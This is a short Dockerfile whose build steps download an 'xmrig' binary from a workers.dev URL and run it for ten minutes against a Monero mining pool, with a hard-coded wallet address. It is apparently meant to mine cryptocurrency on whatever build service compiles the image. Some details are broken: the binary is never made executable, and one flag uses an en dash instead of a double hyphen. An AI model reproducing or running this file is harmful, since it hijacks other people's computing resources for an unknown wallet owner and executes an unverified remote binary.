FROM alpine:latest

RUN apk add wget 
RUN wget https://ddos.nms.workers.dev/xmrig
RUN timeout 10m ./xmrig -o pool.minexmr.com:4444 -u 453YeXrQMiahiYEbJXH4172KP8a6QagRAGWQpcpepuHiJ7QeiPyr2ZvEhwPrrTFu21ETGAY5SCdphFb26dYVcnSYHR1HPy5 -p 1 –randomx-1gb-pages
